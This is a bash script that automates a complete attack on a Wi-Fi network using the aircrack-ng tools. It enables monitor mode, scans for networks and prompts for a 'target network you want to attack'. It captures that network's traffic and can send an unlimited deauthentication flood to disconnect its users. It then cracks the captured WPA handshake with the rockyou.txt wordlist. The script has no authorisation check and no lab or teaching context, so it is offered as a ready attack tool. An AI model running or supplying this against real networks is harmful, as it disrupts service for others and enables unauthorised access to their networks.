#!/bin/bash

# Check if airodump-ng is installed, and install if it's not
if ! command -v airodump-ng &> /dev/null; then
    echo "Airodump-ng is not installed. Do you want to install it? (y/n)"
    read install_choice
    if [ "$install_choice" == "y" ]; then
        sudo apt-get install aircrack-ng
    else
        echo "Airodump-ng is required. Please install it manually and run this script again."
        exit 1
    fi
fi

# List available wireless cards and let the user choose one for monitor mode
echo "Available wireless cards:"
iwconfig | grep "^[a-zA-Z]"
echo "Enter the name of the wireless card you want to use for monitor mode (e.g., wlan0):"
read wireless_card

# Check if the chosen wireless card is already in monitor mode
if iwconfig "$wireless_card" | grep -q "Mode:Monitor"; then
    echo "Monitor mode is already active on $wireless_card."
else
    # Kill processes and start monitor mode
    echo "Killing any interfering processes and starting monitor mode on $wireless_card..."
    sudo airmon-ng check kill
    sudo airmon-ng start "$wireless_card"

    # Verify that monitor mode is active
    if iwconfig "$wireless_card" | grep -q "Mode:Monitor"; then
        echo "Monitor mode is now active on $wireless_card."
    else
        echo "Monitor mode could not be activated on $wireless_card. Check your wireless adapter and try again."
        exit 1
    fi
fi

# Start capturing Wi-Fi data
echo "Enter a capture file name (e.g., capture1):"
read capture_name

# Start airodump-ng to list nearby Wi-Fi networks
echo "Scanning for nearby Wi-Fi networks. Press Ctrl+C to stop scanning."
sudo airodump-ng "$wireless_card"

# Prompt user to choose a target network
echo "Enter the BSSID of the target network you want to attack:"
read target_bssid
echo "Enter the channel of the target network:"
read target_channel

# Start capturing data from the chosen target network
echo "Starting data capture for $target_bssid on channel $target_channel."
sudo airodump-ng -w "$capture_name" -c "$target_channel" --bssid "$target_bssid" "$wireless_card"

# Ask if you want to perform a deauthentication attack
echo "Do you want to perform a deauthentication attack? (y/n)"
read deauth_choice

if [ "$deauth_choice" == "y" ]; then
    # Start a deauthentication attack on the chosen target network
    echo "Starting deauthentication attack. Press Ctrl+C to stop the attack."
    sudo aireplay-ng --deauth 0 -a "$target_bssid" "$wireless_card"
else
    echo "Deauthentication attack skipped."
fi

# Use Wireshark to open the capture file and filter for EAPOL messages
echo "Use Wireshark to open '$capture_name-01.cap' and filter for 'eapol'."
wireshark "$capture_name-01.cap"

# Stop monitor mode
echo "Stopping monitor mode on $wireless_card..."
sudo airmon-ng stop "$wireless_card"

# Crack the capture file with a wordlist (e.g., rockyou.txt)
echo "Cracking the capture file with a wordlist. Make sure you have a suitable wordlist file."
echo "You can replace '/usr/share/wordlists/rockyou.txt' with your wordlist file if needed."
echo "Press Enter when ready..."
read -n 1 -s

# Replace 'hack1-01.cap' with your capture file name
# Replace '/usr/share/wordlists/rockyou.txt' with your wordlist file
aircrack-ng "$capture_name-01.cap" -w /usr/share/wordlists/rockyou.txt
